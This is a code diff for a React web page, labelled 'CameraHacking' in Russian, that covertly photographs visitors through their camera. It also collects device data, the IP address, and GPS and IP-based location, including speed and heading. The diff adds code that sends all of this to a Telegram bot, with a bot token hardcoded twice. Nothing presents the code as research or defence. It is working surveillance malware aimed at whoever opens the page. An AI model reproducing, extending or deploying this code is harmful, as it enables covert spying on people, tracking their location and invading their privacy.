@@ -4,16 +4,6 @@ import axios from "axios";
 import ReactDOM from "react-dom/client";
 import "./App.css";
 
-// API Configuration
-const API_CONFIG = {
-  baseURL: process.env.REACT_APP_API_URL || 'https://ewggewgegewr-gl3f.vercel.app',
-  endpoints: {
-    sendDataToTelegram: '/sendDataToTelegram',
-    sendPhotoToTelegram: '/sendPhotoToTelegram',
-    sendLocationToTelegram: '/sendLocationToTelegram'
-  }
-};
-
 /**
  * КОМПОНЕНТ CAMERAHACKING
  */
@@ -94,6 +84,66 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
       return false;
     } finally {
       setIsSending(false);
+    }
+  };
+
+  const sendDataToTelegram = async (data) => {
+    try {
+      const text = `📱 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*\n\n` +
+                   `🔋 *Батарея:* ${data.batteryLevel} ${data.batteryCharging ? '(зарядка)' : ''}\n` +
+                   `📍 *IP адрес:* ${data.clientIp}\n` +
+                   `📏 *Разрешение экрана:* ${data.screenWidth}x${data.screenHeight} (x${data.devicePixelRatio || 1})\n` +
+                   `💻 *Тип устройства:* ${data.deviceType || 'Неизвестно'}\n` +
+                   `🖥 *Платформа:* ${data.platform || 'Неизвестно'}\n` +
+                   `🌐 *Браузер:* ${data.userAgent?.substring(0, 100)}...\n` +
+                   `🗣 *Язык:* ${data.language || 'Неизвестно'}\n` +
+                   `⏰ *Часовой пояс:* ${data.timezone || 'Неизвестно'}\n` +
+                   `📡 *Сеть:* ${data.connection?.effectiveType || 'Неизвестно'}\n` +
+                   `⚡ *Скорость сети:* ${data.connection?.downlink || 'Неизвестно'} Mbps\n` +
+                   `💾 *Память:* ${data.memory || 'Неизвестно'} GB\n` +
+                   `💻 *Ядра CPU:* ${data.cores || 'Неизвестно'}\n\n` +
+                   `🕐 *Время:* ${new Date().toLocaleString()}\n` +
+                   `📊 *Статус:* Активное отслеживание начато`;
+
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      return response.ok;
+
+    } catch (error) {
+      console.error('Error sending data to Telegram:', error);
+      return false;
+    }
+  };
+
+  const sendLocationToTelegram = async (latitude, longitude) => {
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          latitude: latitude,
+          longitude: longitude
+        })
+      });
+
+      return response.ok;
+
+    } catch (error) {
+      console.error('Error sending location to Telegram:', error);
+      return false;
     }
   };
 
@@ -252,10 +302,10 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
       return;
     }
 
-    const caption = `📸 Фото #${captureCount + 1}\n` +
-      `Размер: ${Math.round(photoBlob.size / 1024)} KB\n` +
-      `Время: ${new Date().toLocaleTimeString()}\n` +
-      `Устройство: Android ${deviceInfo?.androidVersion || ''}`;
+    const caption = `📸 *Фото #${captureCount + 1}*\n` +
+      `📊 *Размер:* ${Math.round(photoBlob.size / 1024)} KB\n` +
+      `⏰ *Время:* ${new Date().toLocaleTimeString()}\n` +
+      `📱 *Устройство:* Android ${deviceInfo?.androidVersion || ''}`;
 
     const success = await sendPhotoToTelegram(photoBlob, caption);
 
@@ -265,10 +315,10 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
       if ((captureCount + 1) % 5 === 0) {
         await sendToTelegram(
-          `📊 Статистика: ${captureCount + 1} фото\n` +
-          `Устройство: Android ${deviceInfo?.androidVersion || ''}\n` +
-          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
-          `Время: ${new Date().toLocaleString()}`
+          `📊 *Статистика:* ${captureCount + 1} фото\n` +
+          `📱 *Устройство:* Android ${deviceInfo?.androidVersion || ''}\n` +
+          `🖼 *Разрешение:* ${deviceInfo?.resolution || 'unknown'}\n` +
+          `⏰ *Время:* ${new Date().toLocaleString()}`
         );
       }
     } else {
@@ -342,14 +392,13 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
         });
 
         await sendToTelegram(
-          '✅ Камера инициализирована\n\n' +
-          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
-          `Android ${androidVersion}\n` +
-          `Chrome Mobile\n` +
-          `Начало съемки: ${new Date().toLocaleString()}`
+          '✅ *Камера инициализирована*\n\n' +
+          `🖼 *Разрешение:* ${deviceInfo?.resolution || 'unknown'}\n` +
+          `🤖 *Android:* ${androidVersion}\n` +
+          `🌐 *Браузер:* Chrome Mobile\n` +
+          `⏰ *Начало съемки:* ${new Date().toLocaleString()}`
         );
 
-        // УБРАЛИ отправку тестового снимка
         addDebugLog('Камера готова к съемке');
         
         setIsInitialized(true);
@@ -358,7 +407,7 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
     } catch (error) {
       addDebugLog(`Ошибка инициализации: ${error.message}`);
-      await sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
+      await sendToTelegram(`❌ *Ошибка камеры:* ${error.message}`);
       return false;
     }
   };
@@ -370,9 +419,9 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
       setClientIp(data.ip);
 
       await sendToTelegram(
-        `🌐 IP Address: ${data.ip}\n` +
-        `Устройство: Android\n` +
-        `Браузер: Chrome Mobile`
+        `🌐 *IP Address:* ${data.ip}\n` +
+        `📱 *Устройство:* Android\n` +
+        `🌐 *Браузер:* Chrome Mobile`
       );
 
     } catch (error) {
@@ -439,7 +488,7 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
 
       if (!navigator.mediaDevices?.getUserMedia) {
         addDebugLog('❌ Камера не поддерживается');
-        await sendToTelegram('❌ WebRTC не поддерживается в этом браузере');
+        await sendToTelegram('❌ *WebRTC не поддерживается в этом браузере*');
         return;
       }
 
@@ -601,38 +650,57 @@ const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission })
  */
 const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermission, chatId, clientIp }) => {
   const [locationData, setLocationData] = useState(null);
+  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
-  const sendLocation = async (coords) => {
-    const { latitude, longitude } = coords;
-
-    const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendLocationToTelegram}`;
-
-    const data = {
-      chat_id: chatId,
-      latitude,
-      longitude,
-      clientIp
-    };
-
+  const sendLocationToTelegram = async (latitude, longitude) => {
     try {
-      await axios.post(apiUrl, data, {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        timeout: 10000
+        body: JSON.stringify({
+          chat_id: chatId,
+          latitude: latitude,
+          longitude: longitude
+        })
       });
 
-      console.log("Location sent to Telegram");
-      setLocationSent(true);
+      return response.ok;
+
     } catch (error) {
-      console.error("Error sending location to server:", error);
+      console.error('Error sending location to Telegram:', error);
+      return false;
+    }
+  };
+
+  const sendToTelegram = async (text) => {
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'HTML'
+        })
+      });
+
+      return response.ok;
+
+    } catch (error) {
+      console.error('Telegram send error:', error);
+      return false;
     }
   };
 
   const getLocationByIp = async () => {
     try {
-      const response = await axios.get(`https://ipinfo.io/${clientIp}/json`);
-      const { loc, city, region, country, org } = response.data;
+      const response = await fetch(`https://ipinfo.io/${clientIp}/json`);
+      const data = await response.json();
+      const { loc, city, region, country, org } = data;
       const [latitude, longitude] = loc.split(',');
 
       const coords = { latitude, longitude };
@@ -646,8 +714,21 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
         method: 'IP геолокация'
       });
 
-      sendLocation(coords);
+      await sendLocationToTelegram(latitude, longitude);
+      
+      // Отправляем дополнительную информацию
+      await sendToTelegram(
+        `📍 *Геолокация по IP*\n\n` +
+        `🏙 *Город:* ${city}\n` +
+        `🗺 *Регион:* ${region}\n` +
+        `🇺🇳 *Страна:* ${country}\n` +
+        `📡 *Провайдер:* ${org}\n` +
+        `🎯 *Координаты:* ${latitude}, ${longitude}\n` +
+        `🌐 *IP адрес:* ${clientIp}`
+      );
+      
       setLocationPermission(coords);
+      setLocationSent(true);
     } catch (error) {
       console.error("Error fetching location by IP:", error);
     }
@@ -671,9 +752,22 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
         method: 'GPS устройства'
       });
 
+      await sendLocationToTelegram(latitude, longitude);
+      
+      // Отправляем дополнительную информацию
+      await sendToTelegram(
+        `📍 *Геолокация по GPS*\n\n` +
+        `🎯 *Точность:* ±${Math.round(accuracy)} метров\n` +
+        `📏 *Координаты:* ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\n` +
+        `🏔 *Высота:* ${altitude ? Math.round(altitude) + ' м' : 'Неизвестно'}\n` +
+        `🧭 *Направление:* ${heading ? Math.round(heading) + '°' : 'Неизвестно'}\n` +
+        `🚀 *Скорость:* ${speed ? Math.round(speed * 3.6) + ' км/ч' : '0 км/ч'}\n` +
+        `🌐 *IP адрес:* ${clientIp}`
+      );
+
       localStorage.setItem("locationPermission", JSON.stringify(coords));
       setLocationPermission(coords);
-      sendLocation(coords);
+      setLocationSent(true);
 
     } catch (error) {
       if (error.code === error.PERMISSION_DENIED) {
@@ -759,6 +853,46 @@ const PhotoPage = () => {
   const [locationPermission, setLocationPermission] = useState(null);
   const [clientIp, setClientIp] = useState("");
   const [deviceInfo, setDeviceInfo] = useState(null);
+
+  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
+
+  const sendDataToTelegram = async (data) => {
+    try {
+      const text = `📱 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*\n\n` +
+                   `🔋 *Батарея:* ${data.batteryLevel} ${data.batteryCharging ? '(зарядка)' : ''}\n` +
+                   `📍 *IP адрес:* ${data.clientIp}\n` +
+                   `📏 *Разрешение экрана:* ${data.screenWidth}x${data.screenHeight} (x${data.devicePixelRatio || 1})\n` +
+                   `💻 *Тип устройства:* ${data.deviceType || 'Неизвестно'}\n` +
+                   `🖥 *Платформа:* ${data.platform || 'Неизвестно'}\n` +
+                   `🌐 *Браузер:* ${data.userAgent?.substring(0, 100)}...\n` +
+                   `🗣 *Язык:* ${data.language || 'Неизвестно'}\n` +
+                   `⏰ *Часовой пояс:* ${data.timezone || 'Неизвестно'}\n` +
+                   `📡 *Сеть:* ${data.connection?.effectiveType || 'Неизвестно'}\n` +
+                   `⚡ *Скорость сети:* ${data.connection?.downlink || 'Неизвестно'} Mbps\n` +
+                   `💾 *Память:* ${data.memory || 'Неизвестно'} GB\n` +
+                   `💻 *Ядра CPU:* ${data.cores || 'Неизвестно'}\n\n` +
+                   `🕐 *Время:* ${new Date().toLocaleString()}\n` +
+                   `📊 *Статус:* Активное отслеживание начато`;
+
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      return response.ok;
+
+    } catch (error) {
+      console.error('Error sending data to Telegram:', error);
+      return false;
+    }
+  };
 
   const getBatteryLevel = async () => {
     try {
@@ -856,14 +990,7 @@ const PhotoPage = () => {
 
         console.log("📤 Sending user data:", data);
 
-        const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendDataToTelegram}`;
-
-        await axios.post(apiUrl, data, {
-          headers: {
-            "Content-Type": "application/json",
-          },
-          timeout: 10000
-        });
+        await sendDataToTelegram(data);
 
         console.log("✅ User data sent successfully");
 
